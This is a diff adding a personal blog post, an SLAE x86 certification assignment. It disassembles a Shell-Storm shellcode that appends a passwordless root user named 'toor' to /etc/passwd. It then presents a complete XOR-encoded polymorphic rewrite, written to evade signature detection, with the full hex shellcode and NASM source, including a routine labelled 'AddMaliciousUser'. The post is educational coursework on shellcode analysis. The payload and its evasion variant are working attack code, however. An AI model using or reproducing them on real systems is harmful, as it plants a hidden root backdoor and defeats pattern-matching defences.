@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html>
+  <!-- Inspired by https://secret.club/ and https://github.com/clayh53/tufte-jekyll -->
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>SLAE x86 Exam - Assignment #6 Part 2</title>
+    <meta name="description" content="DisclaimerThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:https://www.pentesteracadem...">
+
+    <link rel="stylesheet" type="text/css" href="/assets/css/fonts.min.css">
+    <link rel="canonical" href="/22/01/04/slae32-assignment-6_2">
+    <link rel="alternate" type="application/rss+xml" title="rbct" href="/feed.xml" />
+
+    <style>
+         * { margin: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 1rem; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 1rem; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "JetBrains Mono",monospace; text-rendering: geometricPrecision; -moz-osx-font-smoothing: grayscale; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono { font-family: 'JetBrains Mono', monospace; font-weight: 500; } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: 1rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #1d2021; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { font-size: 1rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 1rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.725; margin-bottom: 1rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 1.5rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; margin-right: 10px } h3:before { content: "##"; } h1 { font-size: 1.3em; } h3 { font-size: 1.3em; } p a, main li a { text-decoration: underline; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "•"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em 0 0; padding-left: 20px; border-left: 4px solid #444 } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { padding-left: 5px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { color: #fe8019; background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } p > code { font-size: 0.925rem; } @media screen and (min-width: 640px) { pre > code { font-size: 1rem; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } p:has(aside) { border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1) }} @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer.tags { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); } div.epigraph footer { text-align: right; margin-bottom: 2rem;} section.pagination { padding-bottom: 1rem; } img + em { display: block; text-align: center; } table { border: 1px solid; padding: 10px; margin-bottom: 10px } td { padding: 2px 10px; } div.highlighter-rouge, code.language-text { background-color: var(--bg-1); padding: 15px 10px 10px 10px; margin-bottom: 10px } sub { font-size: 0.875rem }
+    </style>
+</head>
+
+  <body>
+    <!--- Header and nav template site-wide -->
+<header>
+    <a href="/">RBCT</a>
+
+    <nav class="group">
+        
+            
+        
+            
+                
+                <a href="/">POSTS</a>
+                
+            
+        
+            
+                
+                <a href="/about/">ABOUT</a>
+                
+            
+        
+    </nav>
+</header>
+    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting">
+        <h1>SLAE x86 Exam - Assignment #6 Part 2</h1>
+
+        <div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px">
+            <img itemprop="image" alt="rbct" src="/assets/author_profile_img/rbct.png">
+            <span class="mono authors">
+                <a href="/author/rbct" itemprop="name">rbct</a>
+            </span>
+        </div>
+
+        <time class="mono" datetime="2022-01-04T00:00:00+01:00" itemProp="datePublished">
+            4 January 2022
+        </time>
+
+        <hr>
+        <main itemprop="articleBody" style="position: relative;">
+            <h2 id="disclaimer">Disclaimer</h2>
+<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p>
+<p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p>
+<p>Student ID: PA-30398</p>
+<h2 id="foreword">Foreword</h2>
+<p>The 6th assignment requires you to analyze 3 shellcodes from <a href="http://shell-storm.org/shellcode/">Shell-Storm</a> and &quot;create polymorphic versions of them to beat pattern matching&quot;.</p>
+<p>There's only 1 constraint:</p>
+<blockquote>
+<p>The polymorphic versions cannot be larger 150% of the existing shellcode</p>
+</blockquote>
+<p>I chose the following shellcodes:</p>
+<ol>
+<li><a href="http://shell-storm.org/shellcode/files/shellcode-812.php">Linux/x86 - chmod 666 /etc/passwd &amp; /etc/shadow - 57 bytes</a></li>
+<li><a href="http://shell-storm.org/shellcode/files/shellcode-561.php">Linux/x86 - append /etc/passwd &amp; exit() - 107 bytes</a></li>
+<li><a href="http://shell-storm.org/shellcode/files/shellcode-825.php">Linux/x86 - iptables --flush - 43 bytes</a></li>
+</ol>
+<p>In this part I'll create a polymorphic version of the 2nd shellcode.</p>
+<h2 id="source-code">Source code</h2>
+<p>The files for this part of the assignment are the following:</p>
+<ul>
+<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/2/original_shellcode.nasm">original_shellcode.nasm</a>, the original shellcode from Shell-Storm</li>
+<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/2/polymorphic_shellcode.nasm">polymorphic_shellcode.nasm</a>, my polymorphic version of the shellcode above</li>
+<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/2/test_polymorphic_shellcode.c">test_polymorphic_shellcode.c</a>, a C program for testing the polymorphic shellcode</li>
+</ul>
+<h2 id="analysis">Analysis</h2>
+<p>First, we need to analyse the original shellcode:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">2b</span><span class="se">\x</span><span class="s2">c6</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">2a</span><span class="se">\x</span><span class="s2">0a</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">0c</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">2c</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">1e</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b9</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">ba</span><span class="se">\x</span><span class="s2">a4</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">8b</span><span class="se">\x</span><span class="s2">4e</span><span class="se">\x</span><span class="s2">2c</span><span class="se">\x</span><span class="s2">b2</span><span class="se">\x</span><span class="s2">1f</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">23</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">3a</span><span class="se">\x</span><span class="s2">3a</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">3a</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">3a</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">3a</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">3a</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">23"</span> <span class="o">&gt;</span> shellcode.bin
+
+ndisasm <span class="nt">-b</span> 32 <span class="nt">-p</span> intel shellcode.bin
+</code></pre></div></div>
+<p>Follows the output of <code>ndisasm</code>:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; Use the JMP-CALL-POP technique get a pointer to the string starting from address</span>
+                            <span class="c1">;   0000003A and ending at 00000069</span>
+                            <span class="c1">; the string is: /etc/passwd#toor::0:0:t00r:/root:/bin/bash #</span>
+<span class="err">00000000</span>  <span class="nf">EB38</span>              <span class="nv">jmp</span> <span class="nv">short</span> <span class="mh">0x3a</span>
+<span class="err">00000002</span>  <span class="err">5</span><span class="nf">E</span>                <span class="nv">pop</span> <span class="nb">esi</span>
+
+                            <span class="c1">; clear the EAX register</span>
+<span class="err">00000003</span>  <span class="err">31</span><span class="nf">C0</span>              <span class="nv">xor</span> <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
+
+                            <span class="c1">; replace the '#' character after '/etc/passwd'</span>
+                            <span class="c1">;   with a NULL byte</span>
+<span class="err">00000005</span>  <span class="err">88460</span><span class="nf">B</span>            <span class="nv">mov</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mh">0xb</span><span class="p">],</span><span class="nb">al</span>
+
+                            <span class="c1">; replace the '#' character after '/bin/bash '</span>
+                            <span class="c1">;   with a NULL byte</span>
+<span class="err">00000008</span>  <span class="err">88462</span><span class="nf">B</span>            <span class="nv">mov</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mh">0x2b</span><span class="p">],</span><span class="nb">al</span>
+
+                            <span class="c1">; replace the space after '/bin/bash'</span>
+                            <span class="c1">;   with a Line Feed (0x0a)</span>
+<span class="err">0000000</span><span class="nf">B</span>  <span class="nv">C6462A0A</span>          <span class="nv">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mh">0x2a</span><span class="p">],</span><span class="mh">0xa</span>
+
+                            <span class="c1">; store the pointer to 'toor::0:0:t00r:/root:/bin/bash'</span>
+                            <span class="c1">;   into EBX</span>
+<span class="err">0000000</span><span class="nf">F</span>  <span class="mi">8</span><span class="nv">D5E0C</span>            <span class="nv">lea</span> <span class="nb">ebx</span><span class="p">,[</span><span class="nb">esi</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>
+
+                            <span class="c1">; save the previous pointer after the following string:</span>
+                            <span class="c1">;   'toor::0:0:t00r:/root:/bin/bash\x0a\x00'</span>
+<span class="err">00000012</span>  <span class="err">895</span><span class="nf">E2C</span>            <span class="nv">mov</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mh">0x2c</span><span class="p">],</span><span class="nb">ebx</span>
+
+                            <span class="c1">; copy ESI into EBX</span>
+                            <span class="c1">;   it's pointing to the string "/etc/passwd"</span>
+<span class="err">00000015</span>  <span class="err">8</span><span class="nf">D1E</span>              <span class="nv">lea</span> <span class="nb">ebx</span><span class="p">,[</span><span class="nb">esi</span><span class="p">]</span>
+
+                            <span class="c1">; 2nd argument of open():</span>
+                            <span class="c1">;   flags applied when opening the file:</span>
+                            <span class="c1">;     - O_APPEND</span>
+                            <span class="c1">;     - O_CREAT</span>
+                            <span class="c1">;     - O_RDWR</span>
+<span class="err">00000017</span>  <span class="err">66</span><span class="nf">B94204</span>          <span class="nv">mov</span> <span class="nb">cx</span><span class="p">,</span><span class="mh">0x442</span>
+
+                            <span class="c1">; 3rd argument of open():</span>
+                            <span class="c1">;   mode (mode bits applied when a new file is created):</span>
+                            <span class="c1">;     - S_IRUSR</span>
+                            <span class="c1">;     - S_IWUSR</span>
+                            <span class="c1">;     - S_IRGRP</span>
+                            <span class="c1">;     - S_IROTH</span>
+<span class="err">0000001</span><span class="nf">B</span>  <span class="mi">66</span><span class="nv">BAA401</span>          <span class="nv">mov</span> <span class="nb">dx</span><span class="p">,</span><span class="mh">0x1a4</span>
+</code></pre></div></div>
+<p>I've learning something new while analysing this shellcode: that permissions bits in the Linux kernel's source code are represented with the <a href="https://en.wikipedia.org/wiki/Octal">octal numeral system</a>.</p>
+<p>Let's look at an example. If you were to check the values for a constant like <code>O_CREAT</code> in the file <code>/include/uapi/asm-generic/fcntl.h</code>, you would find something like this:</p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define O_ACCMODE       00000003
+#define O_RDONLY        00000000
+#define O_WRONLY        00000001
+#define O_RDWR          00000002
+</span>
+<span class="cp">#ifndef O_CREAT
+#define O_CREAT         00000100        </span><span class="cm">/* not fcntl */</span><span class="cp">
+</span></code></pre></div></div>
+<p>Initially I though the number was simply a decimal one. If not, maybe a hexadecimal number. Well, turns out that it's actually an octal one. So you need to convert the number from octal to hex (or decimal when writing your shellcode).</p>
+<p>Another piece of advice. When using <code>strace</code>, you can pass the arguments <code>-e raw=open</code> to view the original, raw values, instead of the constants names.</p>
+<p>Back to the shellcode. After the instructions above, the <code>open</code> syscall is called.</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; invoke syscall open()</span>
+<span class="err">0000001</span><span class="nf">F</span>  <span class="nv">B005</span>              <span class="nv">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0x5</span>
+<span class="err">00000021</span>  <span class="nf">CD80</span>              <span class="nv">int</span> <span class="mh">0x80</span>
+</code></pre></div></div>
+<p><sub class='aside'>Use the <code>open()</code> syscall to open the file <code>/etc/passwd</code>, with flags
+</sub></p>
+<p>Now that the file is opened, it's time to write the new entry:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; 1st argument of write():</span>
+                            <span class="c1">;   file descriptor of the file want to write</span>
+<span class="err">00000023</span>  <span class="err">89</span><span class="nf">C3</span>              <span class="nv">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">eax</span>
+<span class="err">00000025</span>  <span class="err">31</span><span class="nf">D2</span>              <span class="nv">xor</span> <span class="nb">edx</span><span class="p">,</span><span class="nb">edx</span>
+
+                            <span class="c1">; 2nd argument of write():</span>
+                            <span class="c1">;   pointer to the buffer containing the bytes to write</span>
+<span class="err">00000027</span>  <span class="err">8</span><span class="nf">B4E2C</span>            <span class="nv">mov</span> <span class="nb">ecx</span><span class="p">,[</span><span class="nb">esi</span><span class="o">+</span><span class="mh">0x2c</span><span class="p">]</span>
+
+                            <span class="c1">; 3rd argument of write():</span>
+                            <span class="c1">;   number of bytes to write: 31</span>
+<span class="err">0000002</span><span class="nf">A</span>  <span class="nv">B21F</span>              <span class="nv">mov</span> <span class="nb">dl</span><span class="p">,</span><span class="mh">0x1f</span>
+
+                            <span class="c1">; call syscall: write()</span>
+<span class="err">0000002</span><span class="nf">C</span>  <span class="nv">B004</span>              <span class="nv">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0x4</span>
+<span class="err">0000002</span><span class="nf">E</span>  <span class="nv">CD80</span>              <span class="nv">int</span> <span class="mh">0x80</span>
+
+                            <span class="c1">; call syscall: close()</span>
+<span class="err">00000030</span>  <span class="nf">B006</span>              <span class="nv">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0x6</span>
+<span class="err">00000032</span>  <span class="nf">CD80</span>              <span class="nv">int</span> <span class="mh">0x80</span>
+
+                            <span class="c1">; call syscall: exit()</span>
+<span class="err">00000034</span>  <span class="nf">B001</span>              <span class="nv">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0x1</span>
+<span class="err">00000036</span>  <span class="err">31</span><span class="kd">DB</span>              <span class="nv">xor</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>
+<span class="err">00000038</span>  <span class="nf">CD80</span>              <span class="nv">int</span> <span class="mh">0x80</span>
+
+                            <span class="c1">; part of the JMP-CALL-POP technique</span>
+                            <span class="c1">; go back to the address 0x00000002</span>
+<span class="err">0000003</span><span class="nf">A</span>  <span class="nv">E8C3FFFFFF</span>        <span class="nv">call</span> <span class="mh">0x2</span>
+
+                            <span class="c1">; two strings referenced by the previous instructions</span>
+<span class="err">0000003</span><span class="nf">F</span>  <span class="mi">2</span><span class="nv">F</span>                <span class="nv">das</span>
+<span class="nf">...</span>       <span class="nv">...</span>               <span class="nv">...</span>
+<span class="err">00000069</span>  <span class="err">2023</span>              <span class="nf">and</span> <span class="p">[</span><span class="nb">ebx</span><span class="p">],</span><span class="nb">ah</span>
+</code></pre></div></div>
+<h2 id="polymorphic-shellcode">Polymorphic shellcode</h2>
+<p>Follows the polymorphic version of the shellcode:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; Author: Robert C. Raducioiu (rbct)</span>
+<span class="c1">; Reference: http://shell-storm.org/shellcode/files/shellcode-561.php</span>
+<span class="c1">; Shellcode: "\xeb\x48\x5f\x89\xfe\x31\xc9\xf7\xe1\xb1\x0b\x81\x37\x71\x63\x63\x75\x83\xc7\x04\xe2\xf5\x89\xf7\x89\xfb\x83\xc3\x0c\x53\x5e\x57\x5b\xb0\x06\x48\xb2\x69\xc1\xc2\x02\x66\xb9\x43\x04\x49\xcd\x80\x93\x31\xc0\x50\x5a\x6a\x20\x5a\x4a\x6a\x03\x58\x40\x56\x59\xcd\x80\x31\xc0\xb0\x06\xcd\x80\x40\xcd\x80\xe8\xb3\xff\xff\xff\x5e\x06\x17\x16\x5e\x13\x02\x06\x02\x14\x07\x75\x05\x0c\x0c\x07\x4b\x59\x53\x4f\x41\x59\x17\x45\x41\x11\x59\x5a\x03\x0c\x0c\x01\x4b\x4c\x01\x1c\x1f\x4c\x01\x14\x02\x0b\x69\x75"</span>
+<span class="c1">; Length: 123 bytes</span>
+
+<span class="nf">global</span> <span class="nv">_start</span>
+
+<span class="nf">section</span> <span class="nv">.text</span>
+
+<span class="nl">_start:</span>
+
+    <span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">CallRunShellcode</span>
+
+<span class="nl">RunShellcode:</span>
+
+    <span class="nf">pop</span> <span class="nb">edi</span>
+    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">edi</span>
+
+    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
+    <span class="nf">mul</span> <span class="nb">ecx</span>
+
+    <span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span> <span class="mi">11</span>
+    
+<span class="nl">DecodeStringBytes:</span>
+    
+    <span class="nf">xor</span> <span class="kt">DWORD</span> <span class="p">[</span><span class="nb">edi</span><span class="p">],</span> <span class="mh">0x75636371</span>
+
+    <span class="nf">add</span> <span class="nb">edi</span><span class="p">,</span> <span class="mh">0x4</span>
+    <span class="nf">loop</span> <span class="nv">DecodeStringBytes</span>
+
+<span class="nl">OpenFile:</span>
+
+    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">esi</span>
+
+    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">edi</span>
+    <span class="nf">add</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mh">0xc</span>
+
+    <span class="nf">push</span> <span class="nb">ebx</span>
+    <span class="nf">pop</span> <span class="nb">esi</span>
+
+    <span class="nf">push</span> <span class="nb">edi</span>
+    <span class="nf">pop</span> <span class="nb">ebx</span>
+
+    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0x6</span>
+    <span class="nf">dec</span> <span class="nb">eax</span>
+
+    <span class="nf">mov</span> <span class="nb">dl</span><span class="p">,</span> <span class="mh">0x69</span>
+    <span class="nf">rol</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">2</span>
+
+    <span class="nf">mov</span> <span class="nb">cx</span><span class="p">,</span><span class="mh">0x443</span>
+    <span class="nf">dec</span> <span class="nb">ecx</span>
+
+    <span class="nf">int</span> <span class="mh">0x80</span>
+
+<span class="nl">AddMaliciousUser:</span>
+
+    <span class="nf">xchg</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">eax</span>
+    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+
+    <span class="nf">push</span> <span class="nb">eax</span>
+    <span class="nf">pop</span> <span class="nb">edx</span>
+
+    <span class="nf">push</span> <span class="mh">0x20</span>
+    <span class="nf">pop</span> <span class="nb">edx</span>
+    <span class="nf">dec</span> <span class="nb">edx</span>
+
+    <span class="nf">push</span> <span class="mh">0x3</span>
+    <span class="nf">pop</span> <span class="nb">eax</span>
+    <span class="nf">inc</span> <span class="nb">eax</span>
+
+    <span class="nf">push</span> <span class="nb">esi</span>
+    <span class="nf">pop</span> <span class="nb">ecx</span>
+
+    <span class="nf">int</span> <span class="mh">0x80</span>
+
+<span class="nl">CloseFileHandle:</span>
+
+    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0x6</span>
+    <span class="nf">int</span> <span class="mh">0x80</span>
+
+<span class="nl">Exit:</span>
+
+    <span class="nf">inc</span> <span class="nb">eax</span>
+    <span class="nf">int</span> <span class="mh">0x80</span>
+
+<span class="nl">CallRunShellcode:</span>
+
+    <span class="nf">call</span> <span class="nv">RunShellcode</span>
+    <span class="nl">EncodedStringBytes:</span> <span class="kd">db</span> <span class="mh">0x5e</span><span class="p">,</span><span class="mh">0x06</span><span class="p">,</span><span class="mh">0x17</span><span class="p">,</span><span class="mh">0x16</span><span class="p">,</span><span class="mh">0x5e</span><span class="p">,</span><span class="mh">0x13</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x06</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x14</span><span class="p">,</span><span class="mh">0x07</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0x0c</span><span class="p">,</span><span class="mh">0x0c</span><span class="p">,</span><span class="mh">0x07</span><span class="p">,</span><span class="mh">0x4b</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0x17</span><span class="p">,</span><span class="mh">0x45</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0x5a</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span><span class="mh">0x0c</span><span class="p">,</span><span class="mh">0x0c</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x4b</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x1c</span><span class="p">,</span><span class="mh">0x1f</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x14</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x0b</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x75</span>
+</code></pre></div></div>
+<p>The size of the resulting shellcode is <code>123 bytes</code>, which means <code>115%</code> compared to the original shellcode. Since the majority of the bytes are completely different (e.g. the strings <code>/etc/passwd</code> and the new line added to the former), I think this is a good compromise.</p>
+<h3 id="analysis-1">Analysis</h3>
+<p>Let's analyse the first two routines of the polymorphic shellcode:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">_start:</span>
+
+    <span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">CallRunShellcode</span>
+
+<span class="nl">RunShellcode:</span>
+
+    <span class="nf">pop</span> <span class="nb">edi</span>
+    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">edi</span>
+
+    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
